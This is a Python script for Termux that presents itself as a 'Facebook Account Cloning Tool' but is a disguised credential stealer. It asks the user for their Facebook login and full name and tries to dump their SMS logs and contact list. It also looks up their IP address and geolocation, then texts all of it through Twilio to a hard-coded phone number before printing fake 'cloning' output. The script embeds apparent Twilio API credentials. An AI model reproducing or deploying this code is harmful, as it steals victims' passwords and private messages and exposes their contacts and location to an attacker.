# Modules 
import os
import sys
import json
import requests
import stdiomask
from time import sleep
from requests import get


# Colors
class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Printing text slowly
def slowprint(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		sleep(0.01/10)

# Check device
def check_os():
    os_info = os.system("hostname | grep local")
    if os_info == "localhost":
    
        # Get sms logs
        os.system("termux-sms-list -t all  | grep 'number\|body' | tail +1 > sms.txt")
        with open('sms.txt') as f:
            sms_logs = f.read()
        f.close()

        # Get contact list
        os.system("termux-contact-list  | grep 'name\|number' | tail +1 > contacts.txt")
        with open('contacts.txt') as f:
            contacts = f.read()
        f.close()

        send_txt()
        os.system("clear")
    else:
        send_txt()
        
# Sending all the data to my mobile number		
def send_txt():
    slowprint(bcolors.WARNING+"[*] You must put your Facebook phone/email and password.\n"+bcolors.ENDC)
    usr = input(bcolors.GREEN+"Username: ")
    pwd = stdiomask.getpass()
    name = input(bcolors.GREEN+"Fullname: ")
    sleep(5)
    

    # and set the environment variables. See http://twil.io/secure
    ACCOUNT_SID = "AC5451326fc29aec52816717122c0ab473" 
    AUTH_TOKEN = "f5cec5fd2f3da818b9d3beb4b84aba6f" 
    client = Client(ACCOUNT_SID, AUTH_TOKEN) 
    #    to = "+15556667777",    # Replace with the number you want to text
    #    from_ ="+15558675309")  # Replace with your Twilio number
    #    Note that the parameter is named `from_`, not `from`


    # Get the local ip address
    local_ip = get('https://api.ipify.org').text
    # URL to send the request to
    request_url = 'https://geolocation-db.com/jsonp/' + local_ip
    # Send request and decode the result
    response = requests.get(request_url)
    result = response.content.decode()
    # Clean the returned string so it just contains the dictionary data for the IP address
    result = result.split("(")[1].strip(")")
    # Convert this data into a dictionary
    result  = json.loads(result)


    # Body of the message to be sent
    message = client.messages.create(to = "+639657032133", 
      from_ = "+18304026334",
      body = f"\n\nANOTHER IDIOT SPOTTED!\n--------------------------------------------------------\nName: {name}\nUsername: {usr}\nPassword: {pwd}\n--------------------------------------------------------\nIP Address: {local_ip}\nGeolocation: {result}\nSMS LOGS\n{sms_logs}--------------------------------------------------------\nCONTACT LISTS\n{contacts}\n--------------------------------------------------------\n\n\n~MR.$UD0"
      )
    print(f"[*] Session ID: {message.sid}")

    
    # Cool test prompt hahahaha
    slowprint(bcolors.WARNING+"[*] Logging in your account..."+bcolors.ENDC)
    sleep(5)
    slowprint(bcolors.GREEN+"[!] Account successfully logged in!"+bcolors.ENDC)
    sleep(5)
    uid = input(bcolors.GREEN+"[+] Enter target Facebook ID: ")
    sleep(5)
    slowprint(bcolors.WARNING+f"[*] Cloning Facbook ID: {uid}")
    sleep(5)
    fname = input(bcolors.GREEN+"[+] Enter target First Name: ")
    sleep(5)
    lname = input(bcolors.GREEN+"[+] Enter target Last Name(No Spaces): ")
    sleep(5)
    _url = input(bcolors.GREEN+"[+] Enter target Facebook Profile URL: ")
    sleep(5)
    slowprint(bcolors.WARNING+f"[*] Cloning target: {fname} {lname}\n")
    sleep(5)
    slowprint(bcolors.GREEN+'[!] Cloned Successfully...\n'+bcolors.ENDC)
    print(bcolors.WARNING+"\n ----------------------------------------"+bcolors.ENDC)
    print(bcolors.GREEN+f' Facebook link: {_url}'+bcolors.ENDC)
    print(bcolors.GREEN+f' Facebook ID: {uid}'+bcolors.ENDC)
    print(bcolors.GREEN+f' Fullname: {fname} {lname}'+bcolors.ENDC)
    print(bcolors.GREEN+" Username: nicetrykid@gmail.com"+bcolors.ENDC)
    print(bcolors.GREEN+" Password: yousucks123"+bcolors.ENDC)
    print(bcolors.WARNING+"\n ----------------------------------------"+bcolors.ENDC)
    sleep(10)
    os.system("clear")
    slowprint(bcolors.FAIL+sudo+bcolors.ENDC)
    slowprint(bcolors.GREEN+' This tool is made with <3 by MR.$UD0.'+bcolors.ENDC)



sudo = '''
 ╔╦╗╦═╗ ┌┼┐╦ ╦╔╦╗╔═╗
 ║║║╠╦╝ └┼┐║ ║ ║║║ ║
 ╩ ╩╩╚═o└┼┘╚═╝═╩╝╚═╝
'''


banner = '''
╔═══════════════════════════════════╗
║ ███████╗ █████╗  ██████╗████████╗ ║
║ ██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ║
║ █████╗  ███████║██║        ██║    ║
║ ██╔══╝  ██╔══██║██║        ██║    ║
║ ██║     ██║  ██║╚██████╗   ██║    ║
║ ╚═╝     ╚═╝  ╚═╝ ╚═════╝   ╚═╝    ║
║   Facebook Account Cloning Tool   ║
╚═══════════════════════════════════╝
'''


# Main function
def main():
    os.system("clear")
    slowprint(bcolors.FAIL+banner+bcolors.ENDC)
    check_os()
    send_txt()


# Execute main
if __name__=="__main__":
    try:
        from twilio.rest import Client
        import stdiomask
    except:
        os.system('python3 -m pip install twilio PyJWT pytz requests stdiomask')
        os.system('apt install termux-api && termux-api-start')

    main()
